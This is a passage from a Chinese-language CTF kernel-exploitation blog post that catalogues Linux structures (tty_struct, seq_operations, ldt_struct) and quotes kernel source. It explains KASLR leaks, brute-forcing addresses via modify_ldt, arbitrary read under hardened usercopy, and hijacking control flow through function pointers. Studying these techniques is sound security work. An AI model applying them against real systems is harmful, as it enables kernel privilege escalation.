class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">int</span>  (*get_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>    <span class="hljs-type">int</span>  (*set_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址"><a href="#内核-text-段地址" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>我们可以通过 tty_struct 的函数表 <code>tty_operations</code> 来泄露内核 <code>.text</code> 段的地址：</p><p>在 ptmx 被打开时内核通过 <code>alloc_tty_struct()</code> 分配 tty_struct 的内存空间，之后会将 tty_operations 初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops </code>，在调试阶段我们可以先关掉 kaslr 开 root 从 <code>/proc/kallsyms</code> 中读取其偏移</p><p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 ptm_unix98_ops 还是 pty_unix98_ops</p><h4 id="内核线性映射区（-direct-mapping-area）"><a href="#内核线性映射区（-direct-mapping-area）" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>tty_struct 的 <code>dev</code> 成员与 <code>driver</code> 成员都是通过 kmalloc 分配的，那么我们可以通过这两个成员泄露内核线性映射区的地址</p><blockquote><p>笔者目前暂时还没找到通过该结构泄露 page_offset_base 的方法</p></blockquote><h3 id="劫持内核执行流"><a href="#劫持内核执行流" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>若我们能够劫持相应 tty 设备（例如 &#x2F;dev&#x2F;ptmx）的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针，从而劫持内核执行流（例如<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">强网杯2021-noteook</a>)</p><h1 id="0x02-seq-file-相关"><a href="#0x02-seq-file-相关" class="headerlink" title="0x02.seq_file 相关"></a>0x02.seq_file 相关</h1><p><strong>序列文件接口</strong>（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口</p><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>为了简化操作，在内核 <code>seq_file</code> 系列接口中为 file 结构体提供了 private data 成员 <code>seq_file</code> 结构体，该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">size_t</span> from;<br>    <span class="hljs-type">size_t</span> count;<br>    <span class="hljs-type">size_t</span> pad_until;<br>    <span class="hljs-type">loff_t</span> index;<br>    <span class="hljs-type">loff_t</span> read_pos;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br>    <span class="hljs-type">int</span> poll_event;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的函数表成员 op 在打开文件时通过 kmalloc 进行动态分配</p><h2 id="single-open"><a href="#single-open" class="headerlink" title="single_open"></a>single_open</h2><p> 为了更进一步简化内核接口的实现，seq_file 接口提供了 single_open() 这个简化的初始化 file 的函数，其定义于 <code>fs/seq_file.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">single_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">int</span> (*show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *),</span><br><span class="hljs-params">        <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);<br>    <span class="hljs-type">int</span> res = -ENOMEM;<br><br>    <span class="hljs-keyword">if</span> (op) &#123;<br>        op-&gt;start = single_start;<br>        op-&gt;next = single_next;<br>        op-&gt;stop = single_stop;<br>        op-&gt;show = show;<br>        res = seq_open(file, op);<br>        <span class="hljs-keyword">if</span> (!res)<br>            ((<span class="hljs-keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;<br>        <span class="hljs-keyword">else</span><br>            kfree(op);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br>EXPORT_SYMBOL(single_open);<br></code></pre></td></tr></table></figure><p>其中我们可以看到的是在这里使用了 kmalloc 来分配 seq_operations 所需空间，这使得我们有机可乘</p><p>但是我们很难直接操纵 seq_file 结构体，这是因为其所需空间通过 <code>seq_open()</code> 中调用 kzalloc 从单独的 <code>seq_file_cache</code> 中分配</p><h2 id="seq-operations（kmalloc-32-GFP-KERNEL-ACCOUNT）：seq-file-函数表"><a href="#seq-operations（kmalloc-32-GFP-KERNEL-ACCOUNT）：seq-file-函数表" class="headerlink" title="seq_operations（kmalloc-32 | GFP_KERNEL_ACCOUNT）：seq_file 函数表"></a>seq_operations（kmalloc-32 | GFP_KERNEL_ACCOUNT）：seq_file 函数表</h2><p>该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配-x2F-释放-1"><a href="#分配-x2F-释放-1" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>前面我们得知通过 single_open() 函数可以分配 seq_operations 结构体，阅读内核源码，我们注意到存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">stat_open</span>()        &lt;--- stat_proc_ops<span class="hljs-selector-class">.proc_open</span><br>    <span class="hljs-built_in">single_open_size</span>()<br>        <span class="hljs-built_in">single_open</span>()<br></code></pre></td></tr></table></figure><p>注意到 stat_open() 为 procfs 中的 stat 文件对应的 proc_ops 函数表中 open 函数对应的默认函数指针，在内核源码 <code>fs/proc/stat.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">stat_proc_ops</span> =</span> &#123;<br>    .proc_flags    = PROC_ENTRY_PERMANENT,<br>    .proc_open    = stat_open,<br>    .proc_read_iter    = seq_read_iter,<br>    .proc_lseek    = seq_lseek,<br>    .proc_release    = single_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">proc_stat_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    proc_create(<span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;stat_proc_ops);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>fs_initcall(proc_stat_init);<br></code></pre></td></tr></table></figure><p>即该文件对应的是 <code>/proc/id/stat</code> 文件，那么只要我们打开 <code>proc/self/stat</code> 文件便能分配到新的 seq_operations 结构体</p><p>对应地，在定义于 <code>fs/seq_file.c</code> 中的 <code>single_release()</code> 为 stat 文件的 proc_ops 的默认 release 指针，其会释放掉对应的 seq_operations 结构体，故我们只需要关闭文件即可释放该结构体</p><h3 id="数据泄露-1"><a href="#数据泄露-1" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-1"><a href="#内核-text-段地址-1" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>seq_operations 结构体中有着四个内核指针（笔者尚未求证具体是什么函数），若是能够读出这些指针的值我们便毫无疑问能泄露出内核 .text 段的基址</p><h3 id="劫持内核执行流-1"><a href="#劫持内核执行流-1" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong>（例如 <a href="https://www.anquanke.com/post/id/258160">InCTF 2021 - Kqueue</a>）</p><h1 id="0x03-ldt-struct-与-modify-ldt-系统调用"><a href="#0x03-ldt-struct-与-modify-ldt-系统调用" class="headerlink" title="0x03.ldt_struct 与 modify_ldt 系统调用"></a>0x03.ldt_struct 与 modify_ldt 系统调用</h1><p>ldt 即<strong>局部段描述符表</strong>（<strong>Local Descriptor Table</strong>），其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引，在内核中与 ldt 相关联的结构体为 ldt_struct</p><p>在 TCTF&#x2F;0CTF 2021 FINAL 当中由 <a href="https://github.com/yzloser">yzloser 师傅</a>展示给我们的一种_十分美妙的利用方式_——通过 modify_ldt 系统调用来操纵内核中的 ldt_struct 以进行内核空间中的任意读写</p><p>完整利用过程的例子可以参见<a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/">TCTF2021 FINAL - kernote</a></p><h2 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h2><p>该系统调用可以用来操纵对应进程的 ldt_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(modify_ldt, <span class="hljs-type">int</span> , func , <span class="hljs-type">void</span> __user * , ptr ,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> , bytecount)<br>&#123;<br>    <span class="hljs-type">int</span> ret = -ENOSYS;<br><br>    <span class="hljs-keyword">switch</span> (func) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        ret = read_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        ret = read_default_ldt(ptr, bytecount);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x11</span>:<br>        ret = write_ldt(ptr, bytecount, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span><br><span class="hljs-comment">     * return type, but tht ABI for sys_modify_ldt() expects</span><br><span class="hljs-comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span><br><span class="hljs-comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span><br><span class="hljs-comment">     * the compiler does not try to sign-extend the negative</span><br><span class="hljs-comment">     * return codes into the high half of the register when</span><br><span class="hljs-comment">     * taking the value from int-&gt;long.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab"><a href="#ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab" class="headerlink" title="ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)"></a>ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)</h2><p>该结构体定义于内核源码 <code>arch/x86/include/asm/mmu_context.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span><br><span class="hljs-comment">     * needed to prevent us from installing evil descriptors such as</span><br><span class="hljs-comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span><br><span class="hljs-comment">     * allocations, but it&#x27;s not worth trying to optimize.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span>    *<span class="hljs-title">entries</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        nr_entries;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span><br><span class="hljs-comment">     * in user mode.  The whole array will be aliased at the addressed</span><br><span class="hljs-comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span><br><span class="hljs-comment">     * and map, and enable a new LDT without invalidating the mapping</span><br><span class="hljs-comment">     * of an older, still-in-use LDT.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">int</span>            slot;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配（GFP-KERNEL）：modify-ldt-系统调用——write-ldt"><a href="#分配（GFP-KERNEL）：modify-ldt-系统调用——write-ldt" class="headerlink" title="分配（GFP_KERNEL）：modify_ldt 系统调用——write_ldt()"></a>分配（GFP_KERNEL）：modify_ldt 系统调用——write_ldt()</h3><p> 定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">write_ldt</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *ptr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytecount, <span class="hljs-type">int</span> oldmode)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    error = -ENOMEM;<br>    new_ldt = alloc_ldt_struct(new_nr_entries);<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p> 我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程， alloc_ldt_struct() 函数定义于 <code>arch/x86/kernel/ldt.c</code> 中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ldt_struct *<span class="hljs-title function_">alloc_ldt_struct</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> *<span class="hljs-title">new_ldt</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_size;<br><br>    <span class="hljs-keyword">if</span> (num_entries &gt; LDT_ENTRIES)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    new_ldt = kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ldt_struct), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>即我们可以通过 modify_ldt 系统调用来分配新的 ldt_struct</p><h3 id="数据泄露：modify-ldt-系统调用——read-ldt"><a href="#数据泄露：modify-ldt-系统调用——read-ldt" class="headerlink" title="数据泄露：modify_ldt 系统调用——read_ldt()"></a>数据泄露：modify_ldt 系统调用——read_ldt()</h3><p> 定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read_ldt</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *ptr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytecount)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;<br>        retval = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_unlock;<br>    &#125;<br><span class="hljs-comment">//...</span><br>out_unlock:<br>    up_read(&amp;mm-&gt;context.ldt_usr_sem);<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里会<strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong>，我们不难想到的是若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读，由此泄露出内核数据</p><h4 id="①-爆破内核-text-段地址与-page-offset-base"><a href="#①-爆破内核-text-段地址与-page-offset-base" class="headerlink" title="① 爆破内核 .text 段地址与 page_offset_base"></a>① 爆破内核 .text 段地址与 page_offset_base</h4><p>前面讲到若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读 ，但在开启 KASLR 的情况下，我们并不知道该从哪里读取什么数据</p><p>这里我们要用到 <code>copy_to_user</code> 的一个特性：对于非法地址，其<strong>并不会造成 kernel panic，只会返回一个非零的错误码</strong>，我们不难想到的是，我们可以多次修改 ldt-&gt;entries 并多次调用 modify_ldt() 以<strong>爆破内核 .text 段地址与 page_offset_base</strong>，若是成功命中，则 modify_ldt 会返回给我们一个非负值</p><h4 id="②-利用-fork-完成-hardened-usercopy-下的任意地址读"><a href="#②-利用-fork-完成-hardened-usercopy-下的任意地址读" class="headerlink" title="② 利用 fork 完成 hardened usercopy 下的任意地址读"></a>② 利用 fork 完成 hardened usercopy 下的任意地址读</h4><p>当内核开启了 hardened usercopy 时，我们不能够直接搜索整个线性映射区域，这因为这有可能触发 hardened usercopy 的检查</p><p>ldt 是一个与进程全局相关的东西，因此现在让我们将目光放到与进程相关的其他方面上——观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">sys_fork</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">kernel_clone</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">copy_process</span>()</span><br>            <span class="hljs-function"><span class="hljs-title">copy_mm</span>()</span><br>                <span class="hljs-function"><span class="hljs-title">dup_mm</span>()</span><br>                    <span class="hljs-function"><span class="hljs-title">dup_mmap</span>()</span><br>                        <span class="hljs-function"><span class="hljs-title">arch_dup_mmap</span>()</span><br>                            <span class="hljs-function"><span class="hljs-title">ldt_dup_context</span>()</span><br></code></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span><br><span class="hljs-comment"> * the new task is not running, so nothing can be installed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ldt_dup_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *old_mm, <span class="hljs-keyword">struct</span> mm_struct *mm)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,<br>           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);<br><br>       <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>，因此不会触发 hardened usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可</p><h3 id="任意地址写：modify-ldt-系统调用——write-ldt"><a href="#任意地址写：modify-ldt-系统调用——write-ldt" class="headerlink" title="任意地址写：modify_ldt 系统调用——write_ldt()"></a>任意地址写：modify_ldt 系统调用——write_ldt()</h3><p>现在让我们将目光放到 modify_ldt 系统调用中的 <code>write_ldt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 